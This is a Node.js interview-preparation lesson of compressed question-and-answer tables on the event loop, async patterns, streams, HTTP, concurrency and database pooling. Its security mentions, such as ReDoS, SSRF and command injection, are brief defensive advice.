# Lesson 36 — Rapid-fire master Q&A

> **How to use this:** cover the answer column. Say your answer **out loud**, then compare. Anything you got wrong or hedged on goes into `RECALL.md`, and you re-test those every Sunday, cold. Recognition feels like knowledge and isn't: the only useful signal is whether you can *produce* the answer under pressure.
>
> **Answers are compressed on purpose.** They're the shape of a strong answer (mechanism, then the trade-off), not the full explanation; the lesson reference has the depth. Target: ~40 seconds spoken per answer, with a reason attached to every claim.

**Time:** ~2.5 h for a full pass · ~40 min for a re-test · **Prereq:** Lessons 01–35

---

## How answers are scored

| Level | Sounds like |
|---|---|
| **1 — Recall** | The definition. "`setImmediate` runs in the check phase." |
| **2 — Mechanism** | *Why* it works that way, and what breaks otherwise |
| **3 — Judgement** | Level 2 + the trade-off + what you'd actually do + what would change your mind |

Every Node question has a level-3 answer that names **which of the five ideas** is in play: one JS thread, run-to-completion, backpressure, the process as the unit of failure, or managed-but-finite memory.

---

## Part 1 — Foundations (20)

| # | Question | Strong answer |
|---|---|---|
| 1 | Is Node single-threaded? | **One JavaScript thread per isolate**, many runtime threads: libuv's pool (4 by default), V8's platform threads (GC, compilers), and the kernel doing network I/O. A hello-world server has several OS threads. The precise claim: your callbacks never run in parallel with each other; I/O runs in parallel with them. [L01] |
| 2 | What is libuv? | The C library under Node: the event loop, a portable layer over epoll/kqueue/IOCP for non-blocking sockets, timers, signals, child processes, and **a thread pool for work the OS can't do asynchronously** (file I/O, `getaddrinfo`, crypto, zlib). V8 runs your JavaScript; libuv decides when. [L01] |
| 3 | How does one thread serve 10k connections? | Each socket is non-blocking and registered with the kernel's readiness API; the loop makes **one blocking syscall that waits on all of them**, then runs a short callback per ready socket. A connection costs a file descriptor and some heap objects, not a thread with its own stack and context switches. It holds only while every callback is short. [L01] |
| 4 | Why is an awaited DB query not blocking? | The query is bytes written to a socket. `await` suspends the function and **hands the thread back to the loop**; when the reply arrives, the poll phase runs the socket callback, the driver resolves the promise, and your function resumes as a microtask. Nothing sits on a thread waiting. [L01, L06] |
| 5 | Node vs Java virtual threads? | **Same economics, different syntax.** Both make waiting cheap: Loom parks virtual threads on a few carriers and keeps blocking-style code; Node makes suspension explicit with `await`. Pinning a carrier in Loom ≈ blocking the loop in Node. Loom still runs CPU work in parallel across carriers; Node needs worker threads for that. [L01] |
| 6 | When would you not choose Node? | CPU-bound work on the request path (encoding, heavy numerics, big in-memory joins), or a design that needs shared-memory parallelism. I'd still use Node at the I/O edge and **move the CPU work to worker threads or another service**. Saying where your tool loses is the signal. [L01] |
| 7 | Node vs Deno vs Bun? | Deno: V8 + Rust, permissions by default, web-standard APIs. Bun: JavaScriptCore + Zig, fast startup, an all-in-one toolchain. Both chase Node compatibility. Node stays the production default because of **its LTS cadence, ecosystem depth and operational knowledge**, not benchmarks. [L01] |
| 8 | Why does `pg` return a `bigint` column as a string? | JS numbers are IEEE-754 doubles, **exact only up to 2^53 − 1**, and `int8` goes to 2^63 − 1. Converting silently would corrupt large values, so the driver hands you the exact digits and you choose: keep strings, use `BigInt`, or validate values stay under `Number.MAX_SAFE_INTEGER`. [L02] |
| 9 | How do you represent money in JS? | Integer minor units plus a currency, never floats (`0.1 + 0.2 !== 0.3`). Ledger's `amount_minor` arrives from Postgres as a string; parse it to `BigInt` for arithmetic, and remember **`JSON.stringify(10n)` throws a `TypeError`**, so serialize with a replacer or as a string. [L02] |
| 10 | `??` vs `\|\|`? | `\|\|` falls back on any falsy value (`0`, `""`, `false`, `NaN`); `??` only on `null`/`undefined`. `refund.amount \|\| payment.amount` **refunds the whole payment when someone asks to refund 0**. Use `??` for defaults on numbers and strings. [L02] |
| 11 | What is `this` inside `emitter.on("data", this.handle)`? | **The emitter**: EventEmitter calls listeners with `this` set to itself. A timer callback gets the `Timeout` object; a bare detached call in class code gets `undefined` and throws. Fix with an arrow-function class field or `.bind(this)`. [L02, L37] |
| 12 | How does a closure leak memory? | A closure keeps everything it captures reachable for as long as the function is reachable: a listener or interval that captured a 50 MB buffer and is never removed keeps it forever. Closures created in the same scope share one context object, so **a variable captured by one is retained by all of them**. [L02, L27] |
| 13 | What does `class` desugar to, and why does `Object.create(null)` exist? | A constructor function with methods on its `prototype`; property lookup walks the prototype chain. `Object.create(null)` makes an object with **no prototype**, so a key like `__proto__` is plain data: one defence against prototype pollution. [L02, L30] |
| 14 | Why doesn't my script exit? | The loop lives while **referenced handles or pending requests** exist: a listening server, a socket, an interval, a pool holding idle connections, a child process. Close them, or `.unref()` the ones that shouldn't keep the process alive; `process.getActiveResourcesInfo()` (experimental) lists what's open. [L03] |
| 15 | `process.exit()` vs `process.exitCode`? | `exit()` stops **now**: queued callbacks are dropped and output still buffered for a pipe can be lost, which is why `node big.ts \| head` can truncate. `process.exitCode = 1` records the code and lets the loop drain. Call `exit()` only on a fatal path, after a flush timeout. [L03] |
| 16 | Exit codes 1, 13, 137, 143? | 1: uncaught exception or unhandled rejection. 13: a top-level `await` that never settled. **128 + signal number**: 137 = SIGKILL (OOMKilled, or the grace period ran out), 143 = SIGTERM with no handler. The exit code is your first clue when there's no log line. [L03] |
| 17 | How do you handle configuration? | `process.env` values are **always strings** (`"false"` is truthy). Parse and validate everything once at boot with a schema and **fail fast**, so `PORT="abc"` fails the deploy instead of the first request an hour later. `--env-file` / `process.loadEnvFile()` for local runs. [L03] |
| 18 | Can Node run TypeScript? What doesn't work? | Yes: type stripping replaces type syntax with whitespace (stable since 24.12 / 25.2). It **doesn't typecheck** (`tsc --noEmit` in CI), ignores `tsconfig.json` (no `paths`), rejects non-erasable syntax (enums, parameter properties, value namespaces) without `--experimental-transform-types`, and refuses files under `node_modules`, so packages ship JavaScript. [L03] |
| 19 | CommonJS vs ESM: three real differences? | **Loading:** `require` is synchronous; ESM parses, links, then evaluates a static graph, which is what makes top-level `await` possible. **Bindings:** CJS gives you whatever `module.exports` held; ESM imports are **live bindings** to the exporter's variable. **Resolution:** ESM needs full specifiers with extensions and has no `__dirname` (use `import.meta.dirname`) or `require.cache`. [L04] |
| 20 | Can `require()` load ESM? What's the dual-package hazard? | Yes: unflagged since 22.12 and 20.19, so on every supported line; it throws `ERR_REQUIRE_ASYNC_MODULE` if the graph uses top-level `await`. The hazard: one package loaded as a CJS copy and an ESM copy gives **two class identities**, so `instanceof` fails and singletons double. The 2026 answer: ship ESM-only. [L04] |

---

## Part 2 — The event loop & async (36)

| # | Question | Strong answer |
|---|---|---|
| 21 | Explain the event loop. | Six libuv phases: **timers → pending callbacks → idle/prepare → poll → check → close callbacks**, each running its own queue. Between **every** callback Node drains the `process.nextTick` queue, then the microtask queue, until both are empty. Poll blocks in the kernel with a timeout set by the nearest timer. "One callback queue" is the wrong answer. [L05] |
| 22 | What happens in poll when there's nothing to do? | The loop **sleeps in epoll/kqueue/IOCP** with a timeout: zero if immediates are pending, the time to the nearest timer otherwise, indefinitely if neither. That's why an idle Node process uses no CPU. With no referenced handles or requests left, the loop exits instead. [L05] |
| 23 | `process.nextTick` vs `setImmediate`? | **The names are backwards.** `nextTick` runs right after the current callback, before promise callbacks and before the loop moves on; `setImmediate` runs in the check phase. Recursive `nextTick` starves I/O; recursive `setImmediate` yields every iteration. `nextTick` for API deferral, `setImmediate` to yield. [L05] |
| 24 | `setTimeout(fn, 0)` vs `setImmediate(fn)`? | Main module: **nondeterministic**. 0 becomes 1 ms, and it depends on whether 1 ms has passed when the loop first checks timers. Inside an I/O callback: **`setImmediate` always first**, because check comes straight after poll and timers only on the next iteration. [L05] |
| 25 | Where do promise callbacks run? | In V8's **microtask queue**, which isn't a phase: Node drains it after the nextTick queue, after every callback, until empty. A `.then` scheduled inside a timer callback runs before the next timer callback (since Node 11, matching browsers). [L05, L06] |
| 26 | Can a timer fire early? | Never early, often late. The delay is a **minimum**: a 50 ms timer queued behind a 200 ms callback fires at ~200 ms. Timer drift is itself a cheap loop-delay meter. [L05] |
| 27 | How is Node's loop different from the browser's? | The browser runs a task, drains microtasks, then maybe renders; no phases, no `nextTick`, no standard `setImmediate`. Node has libuv phases and **a nextTick queue that jumps ahead of promises**. Both drain microtasks between tasks. [L05] |
| 28 | Top-level code queues a `nextTick` and a `.then`. Which runs first? | **It depends on the module system.** CommonJS: the nextTick. In an ES module the body runs inside a promise job of the asynchronous ESM loader, so the microtask queue keeps draining (the `.then`) before Node gets back to the nextTick queue. Inside any later callback the classic order returns. [L37] |
| 29 | What does `await` actually do? | Suspends the async function, registers the rest of it as a reaction on the awaited promise, and **returns control to the caller**. The continuation runs as a microtask once the promise settles. Even `await 42` yields, so code after an `await` always runs after the caller's next line. [L06] |
| 30 | `return await` vs `return` in an async function? | An async function always returns a promise, and returning a promise adopts it (two extra microtask ticks). Inside `try/catch`, **`return p` lets a rejection escape the catch**; `return await p` handles it there and keeps the frame in the async stack trace. [L06, L37] |
| 31 | What happens to an unhandled rejection in Node 24? | The default `--unhandled-rejections=throw` (since Node 15) raises it as an uncaught exception: **exit code 1**, unless an `'unhandledRejection'` handler exists. The right default: a rejection nobody handles is a lost error and possibly half-applied state. [L06, L09] |
| 32 | What is the "late catch" crash? | `const p = loadA(); await loadB(); await p;` If `p` rejects while `loadB()` waits on I/O, `p` has no handler when the microtask queue drains: **flagged unhandled, process dies**. Attach handlers at creation: `await Promise.all([loadA(), loadB()])`. [L06] |
| 33 | Why is `items.forEach(async …)` broken? | `forEach` ignores the returned promises: nothing waits, ordering is lost, rejections go unhandled. Use `for…of` (sequential), `Promise.all` (parallel) or a bounded `mapLimit` (usually right). The typing side is TS L16's. [L06] |
| 34 | Is async code non-blocking? | Only the waiting is. The synchronous code between awaits runs on the one thread, so a CPU loop inside an `async` function blocks everyone, and **a long chain of already-resolved promises starves the loop**, because microtasks drain completely before any I/O. [L06] |
| 35 | What is Zalgo? | An API that calls back sometimes synchronously and sometimes asynchronously, so callers' ordering assumptions break at random. **Node core always defers**, even when the answer is already known. Rule: always async or always sync. [L06] |
| 36 | Which APIs use the libuv thread pool? | `fs`, `dns.lookup` (`getaddrinfo`, which `http`/`net` use by default), async crypto (`pbkdf2`, `scrypt`, `randomBytes`, `randomFill`, `generateKeyPair`) and async `zlib`. **Not** network sockets (kernel readiness APIs) and not `dns.resolve*()` (c-ares). [L07] |
| 37 | Is Node's I/O handled by a thread pool? | **Partly.** Network I/O isn't: non-blocking sockets, no threads. File I/O is, because there's no portable async file API, along with DNS lookups, crypto and zlib. [L07] |
| 38 | Why would slow DNS slow down file reads? | `http.get(hostname)` resolves via `getaddrinfo` on a pool thread. Four slow lookups **occupy all four threads**, and every `fs` call queues behind them. Fixes: connection reuse, DNS caching, a bigger pool, c-ares resolution where the semantics fit. [L07] |
| 39 | How do you size `UV_THREADPOOL_SIZE`? | Per process, up to 1024, and **set in the environment at launch**, before the pool is first used. Raise it modestly when pool work queues, then measure: threads beyond what the CPU limit can run add memory and context switches, not throughput. [L07] |
| 40 | `bcrypt` vs `bcryptjs` in Node? | Native `bcrypt` runs on the pool: parallel, but competing with fs and DNS. `bcryptjs` is pure JavaScript and **blocks the loop for the whole hash**, as does any `*Sync` crypto. For passwords: async scrypt/argon2 with the pool sized for it. [L07] |
| 41 | CPU at 30%, p99 tripled. What's happening? | One core pegged at 100% reads as low aggregate CPU on a multi-core box: **the loop is blocked**, or the pool is saturated. Prove it with loop-delay p99 and ELU, find the frame with `--cpu-prof`, fix it at the right layer. [L08] |
| 42 | How do you measure event-loop blocking? | `perf_hooks.monitorEventLoopDelay()` for a histogram (p50/p99/max), `performance.eventLoopUtilization()` for ELU, or a ten-line `setInterval` drift meter. **Export p99 delay and ELU as metrics** and alert on them. [L08] |
| 43 | What is ELU and why does it beat CPU%? | The fraction of time the loop spends running callbacks rather than idling in the kernel wait. CPU% mixes in GC threads, pool threads and other processes; **ELU measures the one resource Node runs out of**, the JS thread. ELU near 1 means no headroom. [L08] |
| 44 | What is ReDoS? | A regex with ambiguous nested quantifiers (`^(a+)+$`) **backtracks exponentially** on a near-match, synchronously, on the main thread: one crafted 30-character input freezes the process. Stack Overflow's July 2016 outage was this. Fix: linear patterns, length caps, RE2, never user-supplied patterns. [L08] |
| 45 | How do you process a 1 GB JSON file? | Not with `JSON.parse`: it blocks for seconds, the object graph is several times the file size, and the string can exceed V8's maximum string length. **Stream-parse it** (NDJSON if you control the format), or parse in a worker thread. [L08, L14] |
| 46 | How do you fix a blocked loop? | By layer: **cap the input** (body limits, page sizes), stream instead of buffering, partition long work into `setImmediate` chunks, move CPU work to worker threads, or change the algorithm. Meanwhile protect the process: shed load with 503 when loop delay crosses a threshold. [L08] |
| 47 | Operational vs programmer errors? | Operational: expected failures of a correct program (`ECONNREFUSED`, timeouts, `ENOENT`, invalid input), so **handle them**: retry, map to a status, fall back. Programmer errors are bugs, so **crash**: no handler makes buggy code correct. [L09] |
| 48 | What are Node's four error channels? | `throw`, a callback's `err`, a promise rejection, and the `'error'` event. **An `'error'` event with no listener throws**, which usually kills the process. Each API you write should use one channel consistently. [L09, L11] |
| 49 | Why exit after `uncaughtException`? | The throw unwound through code that may have **half-applied an invariant**: a counter bumped, a lock held, a cache half-updated. State is unknown, so log, flush, set a non-zero code and exit; the supervisor restarts a clean process. [L09] |
| 50 | Compare errors by message or by code? | **By `err.code`** (`ENOENT`, `ECONNRESET`, `ERR_*`): it's the stable contract, and messages change between versions. Your own errors carry a `code` and a `retryable` flag and chain with `{ cause }`. [L09] |
| 51 | What is crash-only design? | Make crashing safe and normal (idempotent operations, transactions, a supervisor) so **recovery is just a restart** and there's no separate, rarely tested shutdown path. Candea and Fox's idea; Kubernetes and systemd are the supervisors. [L09] |
| 52 | Why is `domain` deprecated? | It tried to catch asynchronous errors and **keep the process running**, the "limp on with unknown state" anti-pattern, and it leaked across async boundaries. Replacements: crash and restart, plus `AsyncLocalStorage` for context. [L09] |
| 53 | How do you cancel in-flight work? | `AbortController`/`AbortSignal`, passed as `signal` to `fetch`, `fs`, `timers/promises`, `events.once`, `stream.pipeline` and `child_process`. Your own functions call `signal.throwIfAborted()` and listen for `'abort'` with `{ once: true }`, removing the listener when done. [L10] |
| 54 | Combine a timeout with a user cancel? | `AbortSignal.any([userSignal, AbortSignal.timeout(ms)])`; `signal.reason` tells you which fired (a `TimeoutError` or the caller's reason). One signal then flows into every downstream call. [L10] |
| 55 | Why is `Promise.all` over 10k items dangerous? | It starts everything at once: 10k sockets or descriptors (`EMFILE`), 10k in-flight requests in memory, a downstream rate limit blown, and the first rejection abandons the rest **while they keep running**. Bound it: p-limit, or N workers pulling from one iterator. [L10] |
| 56 | What is Little's law, and how does it size concurrency? | **Concurrency = throughput × latency.** 200 webhooks/s at 0.5 s average needs ~100 in flight. When latency doubles, needed concurrency doubles, and a cap is what stops one slow dependency from consuming everything. [L10] |

---

## Part 3 — Data & I/O (25)

| # | Question | Strong answer |
|---|---|---|
| 57 | Is `emit` asynchronous? | **No.** Listeners run synchronously, in registration order, on the emitter's stack, before `emit` returns; a throw propagates to whoever called `emit`, and a slow listener blocks it. [L11] |
| 58 | `'error'` emitted with no listener? | `emit` **throws** it (wrapping a non-Error value), so the process usually crashes. Every long-lived emitter you own (streams, sockets, pools, child processes) needs an `'error'` listener. [L11] |
| 59 | What does `MaxListenersExceededWarning` mean? | More than 10 listeners for one event on one emitter. **A leak detector, not a limit**: the listener is still added. Usually a listener added per request to a shared emitter; fix the leak, don't raise the limit. [L11] |
| 60 | How do you await an event? | `await events.once(emitter, "ready", { signal })` resolves with the arguments and **rejects if `'error'` fires first**. `events.on(emitter, "data")` gives an async iterator over a stream of events. [L11] |
| 61 | Why do Node APIs defer events emitted during construction? | Listeners attach after the constructor returns, so **a synchronous `emit` in the constructor fires to nobody**. Core defers with `process.nextTick`, so the caller's `.on(...)` lines run first. [L11, L37] |
| 62 | Is an in-process emitter a substitute for the outbox? | No. An emitter is synchronous, in one process, and **lost on a crash**; the outbox row commits in the same transaction as the state change. Emitters are fine for metrics and audit hooks you can afford to lose. [L11] |
| 63 | Where does Buffer memory live? | Outside the V8 heap, in ArrayBuffer backing stores: counted in `external`/`arrayBuffers` and RSS, not `heapUsed`. **A process can be OOMKilled by Buffers while its heap looks small.** [L12, L27] |
| 64 | `Buffer.alloc` vs `Buffer.allocUnsafe`? | `alloc` zero-fills. `allocUnsafe` returns **uninitialized memory** that can hold old data (tokens, other requests), and small ones come from a shared 8 KiB pool. Only when you overwrite every byte immediately. [L12] |
| 65 | What is the pooled-slice leak? | `subarray()` shares memory with its parent, so keeping a 10-byte slice of a large chunk, or of the shared 8 KiB pool, **keeps the whole parent alive**. Copy with `Buffer.from(slice)` before storing it long-term. [L12] |
| 66 | `string.length` vs `Buffer.byteLength`? | UTF-16 code units vs encoded bytes: `"₹"` is 1 vs 3, an emoji 2 vs 4. **`Content-Length` from `str.length` truncates the response.** [L12] |
| 67 | Why can `chunk.toString()` corrupt text? | A multi-byte character split across two chunks decodes as replacement characters. `StringDecoder`, `TextDecoder` with `{ stream: true }`, or `setEncoding("utf8")` **hold the partial bytes until the character is complete**. [L12] |
| 68 | Why verify a webhook HMAC over the raw body? | The signature covers exact bytes. Parse-then-stringify changes whitespace, key order and number formatting, so you'd verify **different bytes from the ones signed**. Capture the raw Buffer with a size cap, then compare digests with `timingSafeEqual`. [L12] |
| 69 | Why `timingSafeEqual`, and why must lengths match? | `===` returns at the first differing byte, leaking the matching prefix through timing. `timingSafeEqual` compares every byte but **throws on unequal lengths**, so compare fixed-length digests, never raw user strings. [L12] |
| 70 | What is backpressure, and what if you ignore it? | The consumer telling the producer to slow down: `write()` returns `false` once the buffer passes `highWaterMark`, and the producer waits for `'drain'`. Ignore it and **nothing errors**: chunks keep queuing in memory until the pod is OOMKilled. [L13] |
| 71 | Is `highWaterMark` a limit or a threshold? | **A threshold**: chunks past it are still buffered; `false` is advice. Defaults: 16 objects in object mode; for bytes, 64 KiB since Node 22 on Linux and macOS but **16 KiB on Windows** (`stream.getDefaultHighWaterMark(false)` tells you); `fs` read streams use 64 KiB. [L13] |
| 72 | `pipe()` vs `pipeline()`? | `pipe()` handles backpressure but **not errors or cleanup**: when one stream fails, the others stay open (leaked descriptors, a DB client never released). `pipeline()` from `node:stream/promises` destroys every stream on error, propagates it, accepts a `signal`, and returns a promise. [L13] |
| 73 | Stream 4M rows to a client and stop on disconnect? | Cursor stream → CSV Transform → gzip → `res`, in one `pipeline(..., { signal })` whose signal aborts on the response's `'close'`. Abort destroys the cursor, releases the DB client, stops the query. **RSS stays flat.** [L13] |
| 74 | How does backpressure cross the network? | A slow client's TCP window fills the kernel send buffer → `res.write()` returns `false` → `pipeline` stops reading the cursor → the driver stops reading its socket → Postgres blocks on its send. **The chain reaches from the client to the database.** [L13] |
| 75 | How do you parse a 2 GB CSV? | `pipeline(upload, splitLines, parse, validate, batch(1000), insert)` with async-generator stages: constant memory, backpressure from the database to the upload socket, bad rows to a side output. A real CSV parser, because quoted fields can contain newlines. [L14] |
| 76 | How do you split a stream into lines? | Carry the text after the last newline into the next chunk, decode with `StringDecoder`, flush the carry at the end, cap the line length. **`chunk.toString().split("\n")` loses lines at every chunk boundary.** [L14, L37] |
| 77 | Node streams vs Web Streams? | Node streams are EventEmitter-based and run the ecosystem; Web Streams are the standard behind `fetch` bodies and edge runtimes, promise-based, with reader locks. Bridge with `Readable.fromWeb()`/`Readable.toWeb()`. [L14] |
| 78 | How do you write a file atomically? | Write a temp file in the **same directory**, `fsync` it, `rename` over the target (atomic on one filesystem), then fsync the directory on POSIX. `writeFile` straight to the target can leave a truncated file after a crash. On Windows, rename can fail with `EPERM`/`EBUSY` if something holds the file. [L15] |
| 79 | What is `EMFILE` and how do you fix it? | Too many open file descriptors for the process limit (`ulimit -n`), almost always from unbounded concurrency over files or sockets. **Bound the concurrency** and close handles on every path; raising the limit is the last step, not the fix. [L15] |
| 80 | How do you prevent path traversal? | `path.resolve(base, input)`, then require that `path.relative(base, resolved)` is neither absolute nor starts with `..`; `realpath` if symlinks are possible. Never use a user-supplied filename as a storage key. [L15] |
| 81 | Is `fs.watch` reliable? | No: behaviour differs by platform, events are coalesced or duplicated, editors replace files with rename-on-save, and the filename can be missing. Fine for dev tooling; production pipelines use a queue or polling. [L15] |

---

## Part 4 — Networking & HTTP (25)

| # | Question | Strong answer |
|---|---|---|
| 82 | Does TCP preserve message boundaries? | **No: it's a byte stream.** Two writes can arrive as one `'data'` event and one write as several. Every protocol frames messages, by delimiter or by length prefix. [L16] |
| 83 | How do database drivers frame messages? | Postgres: a type byte plus a 4-byte length. RESP: a type prefix, CRLF-terminated lines and explicit lengths for bulk strings. A driver is **framing + a request queue + pooling** over a socket. [L16] |
| 84 | What do `ECONNRESET` and `EPIPE` mean? | `ECONNRESET`: the peer sent a RST (it crashed, closed with unread data, or an idle timeout somewhere killed the connection). `EPIPE`: you wrote to a connection the peer had closed. Both operational: handle them, and retry only idempotent work. [L16] |
| 85 | What does `socket.setTimeout()` do? | It only emits `'timeout'` after inactivity. **It closes nothing; you must `destroy()` the socket**, or it stays open forever. [L16] |
| 86 | What is Nagle's algorithm and why disable it? | It holds small writes until outstanding data is ACKed, adding latency to request/response protocols. HTTP servers disable it; raw sockets for such protocols call `setNoDelay(true)`. [L16] |
| 87 | What's a half-open connection? | One side believes the connection is alive after the other vanished (a crash without FIN, a partition, a NAT dropping state). Only traffic detects it: heartbeats, TCP keepalive, timeouts. Not the same as half-*close* (`allowHalfOpen`). [L16] |
| 88 | Intermittent 502s behind an ALB, only on idle connections? | **ALB idle timeout (60 s) > Node's `keepAliveTimeout` (5 s)**: Node closes an idle socket just as the ALB reuses it. Set `keepAliveTimeout` above the LB's idle timeout (e.g. 65 s) and `headersTimeout` above `keepAliveTimeout`. [L17] |
| 89 | What do `keepAliveTimeout`, `headersTimeout` and `requestTimeout` defend? | Idle time between requests on a kept-alive socket (5 s); time to receive complete headers, the slowloris defence (60 s); the whole request including the body (300 s). [L17] |
| 90 | How do you limit body size without buffering? | Reject early on `Content-Length` with 413, then **count bytes as you stream** and destroy the request past the limit, since a chunked body declares no length. Parse JSON in `try/catch` and answer 400. [L17] |
| 91 | How do you detect a client disconnect? | `res.on("close")` firing while `!res.writableFinished`: the client left before the response completed. Wire it to a per-request `AbortController` so the query and outbound calls stop too. [L17, L10] |
| 92 | Why not parse HTTP yourself? | llhttp encodes years of edge cases. A hand parser that disagrees with a proxy about `Content-Length` vs `Transfer-Encoding` is **request smuggling**. Same reason you don't hand-roll TLS. [L17] |
| 93 | Why reuse outbound connections? | A new connection costs DNS + TCP + TLS round trips and CPU, and every close leaves a `TIME_WAIT` entry. undici pools per origin; `http.Agent` has had `keepAlive` on by default since Node 19. [L18] |
| 94 | What happens if you don't consume a `fetch` body? | undici **holds the connection until the body is read or cancelled**, so under load the pool exhausts and requests hang. Always read it or `res.body?.cancel()`, error statuses included. [L18] |
| 95 | What timeouts does an outbound call need? | Connect, headers and body timeouts, plus **a total deadline** (`AbortSignal.timeout`) that also bounds retries. Every outbound call has a deadline. [L18] |
| 96 | What is TIME_WAIT and why do you run out of ports? | The side that closes a TCP connection keeps it in `TIME_WAIT` for a fixed interval (60 s on Linux). A new Agent per request means thousands of them, ephemeral ports run out, and connects fail with `EADDRNOTAVAIL`. [L18] |
| 97 | How do you prevent SSRF in a webhook system? | Resolve the hostname, **reject private, loopback, link-local and metadata addresses** (169.254.169.254), connect to the validated IP through a custom `lookup`, refuse redirects or re-validate each hop, and back it with egress rules. Re-check on every delivery. [L18] |
| 98 | What is DNS rebinding? | The name resolves to a public IP when you validate and a private one when you connect. **Validate the IP you actually connect to** by pinning it in the dispatcher's `lookup`. [L18] |
| 99 | Why is Fastify faster than Express? | A radix-tree router instead of a linear scan of regex routes, **schema-compiled serialization** instead of `JSON.stringify`, less allocation per request. It matters for tiny handlers; behind a 5 ms DB call the gap shrinks to noise. [L19] |
| 100 | How do Express middleware and errors work? | An array of functions and `next()`; error middleware has four arguments. **Express 5 forwards a rejected promise from an async handler to the error middleware**; Express 4 didn't, so the rejection went unhandled. [L19] |
| 101 | NestJS vs Spring? | Deliberately Spring-like: modules, providers, a DI container, guards/interceptors/pipes ≈ beans, filters, AOP. The cost: **decorators plus `emitDecoratorMetadata` aren't erasable**, so you need a build step, and you pay in indirection. [L19] |
| 102 | How do you scale SSE across instances? | Each instance holds its own connections, so every event must reach every instance: Postgres `LISTEN/NOTIFY` (payloads under ~8000 bytes, so send IDs) or Redis pub/sub, then each instance writes to its local subscribers. [L20] |
| 103 | How does SSE resume after a disconnect? | Send `id:` = the event's `sequence`; the browser reconnects with `Last-Event-ID` and you replay everything after it. **Resume means SSE needs no sticky sessions.** [L20] |
| 104 | What's the WebSocket handshake? | A GET with `Upgrade: websocket` and `Sec-WebSocket-Key`; the server answers 101 with `Sec-WebSocket-Accept` = base64(SHA-1(key + a fixed GUID)). Node has a global WebSocket **client** but no built-in server: use `ws`. [L20] |
| 105 | How do you handle a slow SSE or WebSocket consumer? | `res.write()` returns `false` (or `bufferedAmount` grows): stop writing, buffer up to a cap, then **disconnect** and let the client resume from its last ID. Never buffer without a bound per connection. [L20] |
| 106 | Why do my SSE events arrive in bursts? | **Compression middleware buffering the stream**, or a proxy buffering it. Exclude the SSE route from compression and send `X-Accel-Buffering: no`. [L20] |

---

## Part 5 — Concurrency & scaling out (20)

| # | Question | Strong answer |
|---|---|---|
| 107 | When do you use worker threads? | CPU-bound JavaScript: hashing or parsing big data, compression in JS, image work, settlement matching. **Not I/O**, which is already parallel. Measure loop delay before and after. [L21] |
| 108 | Worker threads vs child processes vs cluster? | Workers: same process, a separate isolate and loop each, optional shared memory. Child processes: any program, full isolation, pipes or IPC. Cluster: N Node processes sharing a listening port. **Workers for CPU work, children for other programs, replicas for throughput.** [L21, L23] |
| 109 | How do workers communicate, and what does it cost? | `postMessage` **structured-clones** (a copy, cost proportional to size); a `transferList` moves an ArrayBuffer zero-copy and detaches it in the sender; `SharedArrayBuffer` + `Atomics` shares memory. [L21] |
| 110 | Are there race conditions in Node? | Yes, two kinds. Data races on a `SharedArrayBuffer` without `Atomics`. And **logical races across `await`**: read a balance, await something, write it back, and another request interleaves in between. Fix the second in the database: conditional updates and transactions. [L21] |
| 111 | Why pool workers instead of spawning per request? | Each worker is a full isolate plus event loop: **milliseconds to start, megabytes of memory**. Per-request spawning collapses throughput. Pool them, sized from config (cores minus one), or use piscina. [L21] |
| 112 | Thread pool vs worker threads? | The libuv pool runs libuv's C work for specific APIs; you can't run JavaScript on it. Worker threads run **your JavaScript** in separate isolates. [L07, L21] |
| 113 | `spawn` vs `exec` vs `execFile` vs `fork`? | `spawn`: streams, no shell. `exec`: **runs a shell**, buffers output, fails past `maxBuffer`. `execFile`: no shell, buffered. `fork`: a Node child with an IPC channel. Default to `spawn`/`execFile` with an args array. [L22] |
| 114 | How do you prevent command injection? | Never interpolate input into a shell string. `execFile`/`spawn` with **an args array and no shell**, an allowlist for values, and `--` before user arguments so they can't become flags. [L22] |
| 115 | Why did my child process hang? | Nobody read its stdout: the pipe buffer filled (64 KiB on Linux) and **the child blocked on its next write**. Consume or pipe the output, or set `stdio: "ignore"`. [L22] |
| 116 | How do you kill a process tree? | POSIX: spawn with `detached: true` (a new process group) and `process.kill(-pid)`. Windows: `taskkill /T /F /PID`. Killing only the parent leaves orphans running. [L22] |
| 117 | `'exit'` vs `'close'` on a child? | `'exit'` fires when the process ends, possibly before its stdio drained; `'close'` fires after the stdio streams close. **Use `'close'` when you need the complete output.** [L22] |
| 118 | Why do `.bat` files need care on Windows? | They run through `cmd.exe`, whose argument parsing enabled BatBadBut (CVE-2024-27980, April 2024). Node now **refuses to spawn `.bat`/`.cmd` without `shell: true`** (`EINVAL`), and with a shell you own the escaping. [L22] |
| 119 | How do you use all the cores? | Default: **one process per container, scaled by replicas**. Cluster or PM2 on a bare VM. Worker threads for CPU work inside a service. [L23] |
| 120 | How does cluster distribute connections? | On non-Windows the primary accepts and **round-robins** connections to workers by default; on Windows workers share the listening handle and the OS distributes. [L23] |
| 121 | What breaks going from 1 process to N? | In-memory caches, rate-limit counters (effectively ×N), sessions, WebSocket subscriptions, in-process schedulers (cron runs N times). Move state to Redis/Postgres; elect a leader for singletons. [L23] |
| 122 | How many workers in a container with a 2-CPU limit? | `os.cpus()` reports host cores, not the cgroup quota, so **set the count from config** (~2 here) and measure. Too many runnable threads burn the quota early in each period and CFS throttling stalls you until the next one: p99 spikes at low average CPU. [L23] |
| 123 | Why does my container take 30 s to stop? | Node as **PID 1 with no SIGTERM handler**: the kernel applies no default action to PID 1, so the signal is ignored until SIGKILL ends the grace period (30 s in Kubernetes, 10 s for `docker stop`). Fix: handle SIGTERM, exec-form `CMD`, `--init`/tini. [L24] |
| 124 | Why do requests fail during deploys even with a SIGTERM handler? | Endpoint removal propagates **asynchronously**, so load balancers keep sending traffic for seconds after SIGTERM. Fail readiness and keep serving briefly (a preStop sleep), then close. [L24] |
| 125 | What does `server.close()` do with keep-alive connections? | Stops accepting and waits for open connections to end; since Node 19 it also closes idle ones. In-flight keep-alive sockets close after their response (send `Connection: close`); `closeAllConnections()` is the last resort after the deadline. [L24] |
| 126 | How do you shut down a queue worker safely? | Stop claiming, finish the current job within a deadline or let its lease lapse, then exit. **Idempotent handlers make a redelivered job harmless.** [L24, L26] |

---

## Part 6 — Data & background work (15)

| # | Question | Strong answer |
|---|---|---|
| 127 | Why do connection pools exist? | Each connection costs TCP + TLS + auth round trips, and **Postgres forks a backend process per connection**. Reuse amortizes the setup and bounds the database's process count. [L25] |
| 128 | Why can't you run a transaction with `pool.query`? | Each call may use a different client: `BEGIN` on one, the `INSERT` autocommits on another, `COMMIT` on a third. **Check out one client**: `pool.connect()`, `BEGIN`/`COMMIT`/`ROLLBACK`, `release()` in `finally`. [L25] |
